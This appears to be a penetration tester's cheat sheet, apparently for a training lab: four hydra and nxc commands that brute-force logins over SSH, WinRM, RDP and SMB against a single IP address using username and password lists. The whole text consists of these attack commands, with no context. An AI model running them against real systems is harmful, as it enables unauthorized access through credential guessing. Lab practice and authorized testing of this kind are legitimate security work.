

Bruteforce ssh 

hydra -L username.list -P password.list ssh://10.129.81.110

Bruteforce winrm
nxc winrm 10.129.81.110 -u usernames.list -p passwords.list

Bruteforce RDP:
hydra -L username.list -P password.list rdp://10.129.81.110 


BruteForce SMB:
nxc smb 10.129.81.110 -u username.list -p password.list


